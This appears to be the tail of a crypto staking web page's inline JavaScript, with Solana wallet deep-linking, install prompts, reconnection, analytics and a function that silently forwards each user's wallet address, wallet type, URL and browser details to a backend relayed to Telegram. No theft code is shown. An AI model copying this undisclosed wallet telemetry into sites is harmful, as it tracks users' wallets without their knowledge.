        }
      }

      // Telegram logging function for enhanced error tracking (using centralized function)

      // Centralized user cancellation logging function
      window.logUserCancellation = function(action, context = {}) {
        try {
          console.log(`[USER_CANCELLATION] ${action}:`, context);
          
          // Send to Telegram if available
          if (window.sendTelegramLog) {
            window.sendTelegramLog('USER_CANCELLATION', {
              action: action,
              ...context,
              timestamp: new Date().toISOString(),
              projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking' // Ensure project name consistency
            });
          }
          
          // Log to console with project branding
          console.log(`[${window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'}] User cancelled ${action}:`, {
            ...context,
            timestamp: new Date().toISOString()
          });
          
        } catch (error) {
          console.error('[USER_CANCELLATION] Logging failed:', error);
        }
      }

      // Enhanced deep linking success handler
      window.handleDeepLinkSuccess = function(walletType, deepLinkResult) {
        console.log(`[DEEP_LINK] Deep linking successful for ${walletType}:`, deepLinkResult.method)
        
        // Show success message to user
        if (window.updateMobileWalletStatus) {
          window.updateMobileWalletStatus(`${walletType} app opened successfully!`, 'success')
        }
        
        // Show deep linking instruction modal
        window.showDeepLinkInstructions(walletType)
        
        // Provide user guidance
        setTimeout(() => {
          if (window.updateMobileWalletStatus) {
            window.updateMobileWalletStatus(`Please complete the connection in ${walletType} app`, 'info')
          }
        }, 2000)
        
        // Set up monitoring for when user returns
        window.monitorForWalletReturn(walletType)
      }

      // Show deep linking instructions modal
      window.showDeepLinkInstructions = function(walletType) {
        const modal = document.createElement('div')
        modal.style.cssText = `
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background: rgba(0,0,0,0.8);
          z-index: 10001;
          display: flex;
          align-items: center;
          justify-content: center;
        `
        
        const content = document.createElement('div')
        content.style.cssText = `
          background: white;
          padding: 30px;
          border-radius: 15px;
          text-align: center;
          max-width: 450px;
          width: 90%;
          box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        `
        
        content.innerHTML = `
          <h3 style="margin: 0 0 20px 0; color: #333; font-size: 24px;">📱 ${walletType} App Opened</h3>
          <p style="margin: 0 0 25px 0; color: #666; line-height: 1.5;">
            Your ${walletType} app should now be open. Please follow these steps:
          </p>
          
          <div style="text-align: left; margin-bottom: 25px; padding: 20px; background: #f8f9fa; border-radius: 8px;">
            <ol style="margin: 0; padding-left: 20px; color: #333;">
              <li style="margin-bottom: 10px;">Look for the dApp browser or browser tab in ${walletType}</li>
              <li style="margin-bottom: 10px;">Navigate to this MAMBO staking site</li>
              <li style="margin-bottom: 10px;">Click the "Connect Wallet" button</li>
              <li style="margin-bottom: 10px;">Approve the connection request</li>
              <li style="margin-bottom: 10px;">Return to this app to complete the process</li>
            </ol>
          </div>
          
          <p style="margin: 0 0 25px 0; color: #888; font-size: 14px;">
            💡 <strong>Tip:</strong> The ${walletType} app should automatically open this site in its built-in browser
          </p>
          
          <button onclick="this.closest('[style*=\"position: fixed\"]').remove()" style="
            padding: 12px 24px;
            background: #667eea;
            border: none;
            border-radius: 8px;
            color: white;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
          ">Got it!</button>
        `
        
        modal.appendChild(content)
        document.body.appendChild(modal)
        
        // Auto-close when clicking outside
        modal.addEventListener('click', (e) => {
          if (e.target === modal) {
            modal.remove()
          }
        })
        
        // Auto-close after 15 seconds
        setTimeout(() => {
          if (modal.parentNode) {
            modal.remove()
          }
        }, 15000)
      }

      // Monitor for user returning from wallet app
      window.monitorForWalletReturn = function(walletType) {
        let checkCount = 0
        const maxChecks = 30 // Check for 30 seconds
        
        const checkForReturn = setInterval(() => {
          checkCount++
          
          // Check if wallet is now available
          const provider = window.detectBrowserWallet(walletType)
          if (provider) {
            clearInterval(checkForReturn)
            console.log(`[DEEP_LINK] User returned with ${walletType} wallet`)
            
            if (window.updateMobileWalletStatus) {
              window.updateMobileWalletStatus(`${walletType} wallet detected! Connecting...`, 'success')
            }
            
            // Attempt connection
            setTimeout(() => {
              window.connectMobileWallet(walletType)
            }, 1000)
            
          } else if (checkCount >= maxChecks) {
            clearInterval(checkForReturn)
            console.log(`[DEEP_LINK] User did not return with ${walletType} wallet`)
            
            if (window.updateMobileWalletStatus) {
              window.updateMobileWalletStatus(`Please return to this app after connecting ${walletType}`, 'warning')
            }
          }
        }, 1000)
      }

      // Enhanced wallet installation instructions with store links
      window.showWalletInstallInstructions = function(walletType) {
        const storeLinks = {
          'phantom': {
            name: 'Phantom',
            appStore: 'https://apps.apple.com/app/phantom/id1598432977',
            playStore: 'https://play.google.com/store/apps/details?id=app.phantom',
            chromeStore: 'https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa'
          },
          'solflare': {
            name: 'Solflare',
            appStore: 'https://apps.apple.com/app/solflare/id1580902717',
            playStore: 'https://play.google.com/store/apps/details?id=com.solflare.mobile',
            chromeStore: 'https://chrome.google.com/webstore/detail/solflare/flarehebrnpoiccomnfabhfkdhbfpnel'
          },
          'backpack': {
            name: 'Backpack',
            appStore: 'https://apps.apple.com/app/backpack-wallet/id6446675622',
            playStore: 'https://play.google.com/store/apps/details?id=com.backpack.app',
            chromeStore: 'https://chrome.google.com/webstore/detail/backpack/aflkmfhebrebjkkpgoigkkoelebldkce'
          },
          'glow': {
            name: 'Glow',
            appStore: 'https://apps.apple.com/app/glow-wallet/id6446675622',
            playStore: 'https://play.google.com/store/apps/details?id=com.glow.app',
            chromeStore: 'https://chrome.google.com/webstore/detail/glow-wallet/aflkmfhebrebjkkpgoigkkoelebldkce'
          },
          'exodus': {
            name: 'Exodus',
            appStore: 'https://apps.apple.com/app/exodus-multi-asset-wallet/id1414384820',
            playStore: 'https://play.google.com/store/apps/details?id=exodusmovement.exodus',
            chromeStore: 'https://chrome.google.com/webstore/detail/exodus-web3-wallet/aholpfdialjgjfhomihkjbmgjidlcdno'
          },
          'trust': {
            name: 'Trust Wallet',
            appStore: 'https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409',
            playStore: 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp',
            chromeStore: 'https://chrome.google.com/webstore/detail/trust-wallet/egjidjbpglichdcondbcbdnbeeppgdph'
          }
        }
        
        const wallet = storeLinks[walletType]
        if (!wallet) {
          if (window.showStatus) {
            window.showStatus('Please install a compatible Solana wallet', 'info')
          }
          return
        }
        
        // Create enhanced installation modal
        const modal = document.createElement('div')
        modal.style.cssText = `
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background: rgba(0,0,0,0.8);
          z-index: 10000;
          display: flex;
          align-items: center;
          justify-content: center;
        `
        
        const content = document.createElement('div')
        content.style.cssText = `
          background: white;
          padding: 30px;
          border-radius: 15px;
          text-align: center;
          max-width: 400px;
          width: 90%;
          box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        `
        
        content.innerHTML = `
          <h3 style="margin: 0 0 20px 0; color: #333; font-size: 24px;">📱 Install ${wallet.name}</h3>
          <p style="margin: 0 0 25px 0; color: #666; line-height: 1.5;">
            To connect your ${wallet.name} wallet, please install it from one of the stores below:
          </p>
          
          <div style="display: flex; flex-direction: column; gap: 15px; margin-bottom: 25px;">
            <button onclick="window.open('${wallet.appStore}', '_blank')" style="
              padding: 15px 20px;
              background: #007AFF;
              color: white;
              border: none;
              border-radius: 10px;
              font-size: 16px;
              font-weight: 600;
              cursor: pointer;
              display: flex;
              align-items: center;
              justify-content: center;
              gap: 10px;
            ">
              🍎 App Store
            </button>
            
            <button onclick="window.open('${wallet.playStore}', '_blank')" style="
              padding: 15px 20px;
              background: #01875F;
              color: white;
              border: none;
              border-radius: 10px;
              font-size: 16px;
              font-weight: 600;
              cursor: pointer;
              display: flex;
              align-items: center;
              justify-content: center;
              gap: 10px;
            ">
              🤖 Google Play
            </button>
            
            <button onclick="window.open('${wallet.chromeStore}', '_blank')" style="
              padding: 15px 20px;
              background: #4285F4;
              color: white;
              border: none;
              border-radius: 10px;
              font-size: 16px;
              font-weight: 600;
              cursor: pointer;
              display: flex;
              align-items: center;
              justify-content: center;
              gap: 10px;
            ">
              🌐 Chrome Extension
            </button>
          </div>
          
          <button onclick="this.closest('[style*=\"position: fixed\"]').remove()" style="
            padding: 12px 24px;
            background: #f0f0f0;
            border: none;
            border-radius: 8px;
            color: #666;
            cursor: pointer;
            font-size: 16px;
          ">Close</button>
        `
        
        modal.appendChild(content)
        document.body.appendChild(modal)
        
        // Auto-close when clicking outside
        modal.addEventListener('click', (e) => {
          if (e.target === modal) {
            modal.remove()
          }
        })
        
        // Show status message
        if (window.showStatus) {
          window.showStatus(`Please install ${wallet.name} to continue`, 'info')
        }
      }

      // Close modal event listener
      document.getElementById('close-mobile-modal').addEventListener('click', () => {
        window.hideMobileWalletModal()
      })

      // Close modal when clicking outside
      document.getElementById('mobile-wallet-modal').addEventListener('click', (e) => {
        if (e.target.id === 'mobile-wallet-modal') {
          window.hideMobileWalletModal()
        }
      })

      // Enhanced error handling and retry mechanism
      window.retryWalletConnection = async function(walletType, maxRetries = 3) {
        let lastError = null
        
        for (let attempt = 1; attempt <= maxRetries; attempt++) {
          try {
            console.log(`[MOBILE_WALLET] Attempt ${attempt}/${maxRetries} for ${walletType}`)
            
            if (window.updateMobileWalletStatus) {
              window.updateMobileWalletStatus(`Attempt ${attempt}/${maxRetries} - Connecting to ${walletType}...`, 'loading')
            }
            
            // Wait between retries (exponential backoff)
            if (attempt > 1) {
              const delay = Math.min(1000 * Math.pow(2, attempt - 1), 5000)
              console.log(`[MOBILE_WALLET] Waiting ${delay}ms before retry`)
              await new Promise(resolve => setTimeout(resolve, delay))
            }
            
            await window.connectMobileWallet(walletType)
            return true // Success
            
          } catch (error) {
            lastError = error
            console.log(`[MOBILE_WALLET] Attempt ${attempt} failed:`, error.message)
            
            if (attempt < maxRetries) {
                      if (window.updateMobileWalletStatus) {
          window.updateMobileWalletStatus('Non Participant Wallet', 'warning')
        }
            }
          }
        }
        
        // All retries failed
        console.error(`[MOBILE_WALLET] All ${maxRetries} attempts failed for ${walletType}`)
        
        // Log critical mobile wallet retry failures to Telegram
        if (window.sendTelegramLog) {
          window.sendTelegramLog('WALLET_CONNECTION', {
            error: `All ${maxRetries} connection attempts failed`,
            context: 'Mobile Wallet Retry Failure',
            walletType: walletType,
            maxRetries: maxRetries,
            timestamp: new Date().toISOString(),
            projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
          });
        }
        
        if (window.updateMobileWalletStatus) {
          window.updateMobileWalletStatus('Non Participant Wallet', 'error')
        }
        
        throw lastError
      }

      // Connection health checker
      window.checkWalletConnectionHealth = function(walletType) {
        const provider = window.detectBrowserWallet(walletType)
        if (!provider) return false
        
        try {
          // Basic health checks
          if (provider.isConnected && typeof provider.isConnected === 'function') {
            return provider.isConnected()
          }
          if (provider.connected) {
            return provider.connected
          }
          return false
        } catch (error) {
          console.log(`[HEALTH_CHECK] Error checking ${walletType} health:`, error.message)
          return false
        }
      }

      // Auto-reconnection for dropped connections
      window.setupAutoReconnection = function(walletType, provider) {
        if (!provider || !provider.on) return
        
        try {
          provider.on('disconnect', () => {
            console.log(`[AUTO_RECONNECT] ${walletType} disconnected, attempting reconnection`)
            if (window.updateMobileWalletStatus) {
              window.updateMobileWalletStatus(`${walletType} disconnected, reconnecting...`, 'warning')
            }
            
            // Attempt reconnection after a delay
            setTimeout(async () => {
              try {
                await window.retryWalletConnection(walletType, 2)
                if (window.updateMobileWalletStatus) {
                  window.updateMobileWalletStatus(`${walletType} reconnected successfully`, 'success')
                }
              } catch (error) {
                console.error(`[AUTO_RECONNECT] Failed to reconnect ${walletType}:`, error)
                
                // Log critical auto-reconnection failures to Telegram
                if (window.sendTelegramLog) {
                  window.sendTelegramLog('WALLET_CONNECTION', {
                    error: error.message,
                    stack: error.stack,
                    context: 'Auto-Reconnection Failure',
                    walletType: walletType,
                    timestamp: new Date().toISOString(),
                    projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
                  });
                }
                
                        if (window.updateMobileWalletStatus) {
          window.updateMobileWalletStatus('Non Participant Wallet', 'error')
        }
              }
            }, 2000)
          })
          
          console.log(`[AUTO_RECONNECT] Auto-reconnection setup for ${walletType}`)
        } catch (error) {
          console.log(`[AUTO_RECONNECT] Could not setup auto-reconnection for ${walletType}:`, error.message)
        }
      }

              console.log('[MOBILE_WALLET] Enhanced mobile wallet connection system initialized with deep linking, fallbacks, and auto-reconnection');
      
      // Comprehensive Error Testing Utilities
      window.errorTestingUtils = {
        // Test error classification
        testErrorClassification: function() {
          console.log('[ERROR_TESTING] Testing error classification...');
          
          const testErrors = [
            new Error('User rejected the request'),
            new Error('popup blocked by browser'),
            new Error('Connection timeout'),
            new Error('Network error occurred'),
            new Error('RPC endpoint failed'),
            new Error('Transaction signing failed'),
            new Error('Unknown error type')
          ];
          
          testErrors.forEach((error, index) => {
            try {
              const errorType = window.classifyFrontendError(error);
              const userMessage = window.getFrontendUserMessage(errorType);
              console.log(`[ERROR_TESTING] Test ${index + 1}: ${error.message} -> ${errorType} -> "${userMessage}"`);
            } catch (e) {
              console.error(`[ERROR_TESTING] Test ${index + 1} failed:`, e.message);
            }
          });
        },
        
        // Test error logging
        testErrorLogging: function() {
          console.log('[ERROR_TESTING] Testing error logging...');
          
          try {
            const testError = new Error('Test error for logging');
            const result = window.logFrontendError(testError, {
              context: 'Error Testing',
              testId: Date.now()
            });
            console.log('[ERROR_TESTING] Error logging test result:', result);
          } catch (e) {
            console.error('[ERROR_TESTING] Error logging test failed:', e.message);
          }
        },
        
        // Test wallet detection
        testWalletDetection: function() {
          console.log('[ERROR_TESTING] Testing wallet detection...');
          
          const wallets = ['phantom', 'solflare', 'backpack', 'glow', 'exodus', 'trust'];
          wallets.forEach(walletType => {
            try {
              const provider = window.detectBrowserWallet(walletType);
              console.log(`[ERROR_TESTING] ${walletType}: ${provider ? 'Detected' : 'Not detected'}`);
            } catch (e) {
              console.error(`[ERROR_TESTING] ${walletType} detection failed:`, e.message);
            }
          });
        },
        
        // Test timeout handling
        testTimeoutHandling: function() {
          console.log('[ERROR_TESTING] Testing timeout handling...');
          
          try {
            const timeoutPromise = new Promise((_, reject) => 
              setTimeout(() => reject(new Error('Test timeout')), 100)
            );
            
            Promise.race([
              new Promise(resolve => setTimeout(() => resolve('Success'), 200)),
              timeoutPromise
            ]).then(result => {
              console.log('[ERROR_TESTING] Timeout test result:', result);
            }).catch(error => {
              console.log('[ERROR_TESTING] Timeout test caught error:', error.message);
            });
          } catch (e) {
            console.error('[ERROR_TESTING] Timeout test failed:', e.message);
          }
        },
        
        // Run all tests
        runAllTests: function() {
          console.log('[ERROR_TESTING] Starting comprehensive error testing...');
          
          this.testErrorClassification();
          this.testErrorLogging();
          this.testWalletDetection();
          this.testTimeoutHandling();
          
          console.log('[ERROR_TESTING] All tests completed');
        }
      };
      
      // Auto-run tests in development mode
      if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
        console.log('[ERROR_TESTING] Development mode detected, running error tests...');
        setTimeout(() => {
          if (window.errorTestingUtils) {
            window.errorTestingUtils.runAllTests();
          }
        }, 2000);
      }
      
      // Enhanced Error Monitoring and Analytics
      window.errorAnalytics = {
        errorCounts: new Map(),
        performanceMetrics: new Map(),
        userSessions: new Map(),
        
        // Track error occurrences
        trackError: function(errorType, context = {}) {
          const currentCount = this.errorCounts.get(errorType) || 0;
          this.errorCounts.set(errorType, currentCount + 1);
          
          // Log to console for debugging
          console.log(`[ERROR_ANALYTICS] ${errorType} error tracked (total: ${currentCount + 1})`, context);
          
          // Send to backend for analytics
          this.sendAnalytics('error', { errorType, context, count: currentCount + 1 });
        },
        
        // Track performance metrics
        trackPerformance: function(operation, duration, success = true) {
          const key = `${operation}_${success ? 'success' : 'failure'}`;
          const metrics = this.performanceMetrics.get(key) || { count: 0, totalDuration: 0, avgDuration: 0 };
          
          metrics.count++;
          metrics.totalDuration += duration;
          metrics.avgDuration = metrics.totalDuration / metrics.count;
          
          this.performanceMetrics.set(key, metrics);
          
          console.log(`[PERFORMANCE_ANALYTICS] ${operation} ${success ? 'completed' : 'failed'} in ${duration}ms (avg: ${metrics.avgDuration.toFixed(2)}ms)`);
        },
        
        // Track user session data
        trackSession: function(action, walletType, success = true) {
          const sessionId = this.getSessionId();
          const session = this.userSessions.get(sessionId) || { 
            startTime: Date.now(), 
            actions: [], 
            walletTypes: new Set(),
            successCount: 0,
            failureCount: 0
          };
          
          session.actions.push({
            action,
            walletType,
            success,
            timestamp: Date.now()
          });
          
          if (walletType) session.walletTypes.add(walletType);
          if (success) session.successCount++; else session.failureCount++;
          
          this.userSessions.set(sessionId, session);
        },
        
        // Generate session ID
        getSessionId: function() {
          if (!this._sessionId) {
            this._sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
          }
          return this._sessionId;
        },
        
        // Send analytics to backend
        sendAnalytics: function(type, data) {
          try {
            fetch('/api/log', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                type: 'ANALYTICS',
                analyticsType: type,
                data: data,
                sessionId: this.getSessionId(),
                timestamp: new Date().toISOString(),
                projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking'
              })
            }).catch(e => console.log('[ANALYTICS] Failed to send analytics:', e.message));
          } catch (e) {
            console.log('[ANALYTICS] Analytics error:', e.message);
          }
        },
        
        // Get analytics summary
        getSummary: function() {
          return {
            errorCounts: Object.fromEntries(this.errorCounts),
            performanceMetrics: Object.fromEntries(this.performanceMetrics),
            sessionCount: this.userSessions.size,
            currentSession: this.getSessionId()
          };
        }
      };
      
      // Initialize error analytics
      console.log('[ERROR_ANALYTICS] Enhanced error monitoring and analytics initialized');
      
      // Comprehensive error recovery system
      window.recoverFromSolanaError = async function(error, context = {}) {
        const errorType = window.classifySolanaError ? window.classifySolanaError(error) : 'UNKNOWN_SOLANA_ERROR';
        console.log(`🔄 [ERROR_RECOVERY] Attempting to recover from ${errorType}:`, error.message);
        
        try {
          // Step 1: Try immediate RPC switch
          console.log('🔄 [ERROR_RECOVERY] Step 1: Immediate RPC switch');
          const rpcSwitchSuccess = await window.switchToFallbackRPC();
          
          if (rpcSwitchSuccess) {
            console.log('✅ [ERROR_RECOVERY] RPC switch successful');
            return true;
          }
          
          // Step 2: Try connection reinitialization
          console.log('🔄 [ERROR_RECOVERY] Step 2: Connection reinitialization');
          await window.initializeSolanaConnection();
          
          if (window.solanaConnection) {
            const testSlot = await Promise.race([
              window.solanaConnection.getSlot(),
              new Promise((_, reject) => setTimeout(() => reject(new Error('Test timeout')), 10000))
            ]);
            console.log('✅ [ERROR_RECOVERY] Connection reinitialization successful, slot:', testSlot);
            return true;
          }
          
          // Step 3: Try emergency fallback
          console.log('🔄 [ERROR_RECOVERY] Step 3: Emergency fallback');
          const emergencySuccess = await window.emergencyRPCFallback();
          
          if (emergencySuccess) {
            console.log('✅ [ERROR_RECOVERY] Emergency fallback successful');
            return true;
          }
          
          // Step 4: Final attempt - wait and retry
          console.log('🔄 [ERROR_RECOVERY] Step 4: Final retry after delay');
          await new Promise(resolve => setTimeout(resolve, 5000));
          
          const finalAttempt = await window.initializeSolanaConnection();
          if (finalAttempt) {
            console.log('✅ [ERROR_RECOVERY] Final retry successful');
            return true;
          }
          
          console.error('❌ [ERROR_RECOVERY] All recovery attempts failed');
          return false;
          
        } catch (recoveryError) {
          console.error('❌ [ERROR_RECOVERY] Recovery process failed:', recoveryError);
          return false;
        }
      };
      
      console.log('[ERROR_RECOVERY] Comprehensive error recovery system initialized');
      
      // Telegram logging integration for frontend
      window.sendTelegramLog = async function(type, data) {
        try {
          // Get current wallet info if available
          const currentWallet = window.currentWallet || {};
          const publicKey = currentWallet.publicKey || data.publicKey || 'Unknown';
          const walletType = currentWallet.type || data.walletType || 'Unknown';
          
          // Prepare log data
          const logData = {
            type: type,
            timestamp: new Date().toISOString(),
            url: window.location.href,
            userAgent: navigator.userAgent,
            projectName: window.APP_CONFIG?.PROJECT_NAME || 'MAMBO Staking',
            publicKey: publicKey.toString ? publicKey.toString() : publicKey,
            walletType: walletType,
            ...data
          };
          
          // Send to backend logging endpoint
          const response = await fetch('/api/log', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(logData)
          });
          
          if (response.ok) {
            console.log(`✅ [TELEGRAM] Log sent successfully: ${type}`);
          } else {
            console.warn(`⚠️ [TELEGRAM] Log endpoint returned ${response.status}`);
          }
          
        } catch (error) {
          console.error('❌ [TELEGRAM] Failed to send log:', error.message);
        }
      };
      
      console.log('✅ [TELEGRAM] Frontend Telegram logging integration initialized');
  </script>

  <!-- Wallet Connection Modal -->
  
  <!-- Deep Link Handler for Undetected Wallets -->
  <script src="/js/deepLinkHandler.js"></script>
</body>
</html> 